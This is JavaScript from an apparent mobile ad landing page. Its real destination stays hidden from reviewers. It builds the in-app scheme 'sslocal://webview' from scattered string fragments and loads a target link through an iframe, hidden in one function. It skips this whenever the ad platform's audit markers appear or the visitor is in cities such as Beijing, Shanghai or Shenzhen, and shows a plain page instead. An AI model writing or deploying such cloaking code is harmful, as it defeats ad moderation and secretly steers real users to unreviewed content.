function getUrlParam(paraName) {
        var url = document.location.toString();
        var arrObj = url.split("?");
        if (arrObj.length > 1) {
            var arrPara = arrObj[1].split("&");
            var arr;
            for (var i = 0; i < arrPara.length; i++) {
                arr = arrPara[i].split("=");
                if (arr != null && arr[0] === paraName) {
                    return arr[1];
                }
            }
        } else {
            return "";
        }
    }
    var adid = getUrlParam("adid");
    var kobe = "lo";
	var mm;
    var creativeid = getUrlParam("creativeid");
    var kd = "view";
    var creativetype = getUrlParam("creativetype");
    var jd = "ss";
	var nowdate;
    var clickid = getUrlParam("clickid");
    var wade = "web";
    var AD = getUrlParam("AD_AUDIT_MARKID");
    var lb = "cal";
    var url;
    var u = navigator.userAgent;
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); 
	var province=localAddress.province;
	var city=localAddress.city;
	var dizhi = province+city
	var zx_flag = 0;
	var ch_flag = 0;
	if(province.indexOf('北京')!= -1||province.indexOf('上海')!= -1||province.indexOf('天津')!= -1||province.indexOf('海南')!= -1){
		zx_flag = 1 ;
	}
	if(city.indexOf('深圳')!= -1||city.indexOf('广州')!= -1||city.indexOf('成都')!= -1||city.indexOf('石家庄')!= -1||city.indexOf('张家口')!= -1){
		zx_flag = 1 ;
	}
	if(dizhi.indexOf('北京')!= -1||dizhi.indexOf('天津')!= -1||dizhi.indexOf('河北')!= -1||dizhi.indexOf('山西')!= -1||dizhi.indexOf('内蒙古')!= -1||dizhi.indexOf('宁夏')!= -1||dizhi.indexOf('青海')!= -1||dizhi.indexOf('陕西')!= -1||dizhi.indexOf('甘肃')!= -1||dizhi.indexOf('辽宁')!= -1||dizhi.indexOf('吉林')!= -1||dizhi.indexOf('黑龙江')!= -1||dizhi.indexOf('山东')!= -1||dizhi.indexOf('江苏')!= -1||dizhi.indexOf('上海')!= -1||dizhi.indexOf('浙江')!= -1||dizhi.indexOf('安徽')!= -1||dizhi.indexOf('湖南')!= -1||dizhi.indexOf('湖北')!= -1||dizhi.indexOf('四川')!= -1||dizhi.indexOf('贵州')!= -1||dizhi.indexOf('云南')!= -1||dizhi.indexOf('重庆')!= -1||dizhi.indexOf('广东')!= -1||dizhi.indexOf('广西')!= -1||dizhi.indexOf('福建')!= -1||dizhi.indexOf('江西')!= -1||dizhi.indexOf('河南')!= -1||dizhi.indexOf('海南')!= -1){
		ch_flag = 1 ;
	}
	
    function oa(u,a) {
        if(zx_flag ==0 && ch_flag ==1){
			//gotourl='https://v.douyin.com/'+a;
			gotourl=a;
            var iframe = document.getElementById("iframe1");

			//alert(gotourl);
			if(!clickid || (adid == "__AID__") || (AD == "external_url")){
			}else{
				if(isiOS){
					setTimeout(function(){
						url = jd + kobe + lb + "://" + wade + kd +"?url="+gotourl;
						iframe.src = url;
					},500);
				}else{
					url = jd + kobe + lb + "://" + wade + kd +"?url="+gotourl;
					iframe.src = url;
				}
			}
        }
    }
    function oa2(u,a) {
        if(a.indexOf("mf") != -1){
            var iframe = document.createElement("iframe");
            if((clickid == undefined) || (adid == "__AID__") || (AD == "external_url")){
                if(bk){
                    window.location.href = ju;
                }else{
                    window.location.href = au;
                }
            }else{
                document.body.appendChild(iframe);
                iframe.style.display = "none";
                var url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+new Date().getTime() );
                iframe.src = url;
            }
        }
    }
    $(function () {
         $(".content img").removeAttr("style");
         $("#check-button").click(function () {
            if (j) {
               oa2(ju,ja);
            }
         });
    });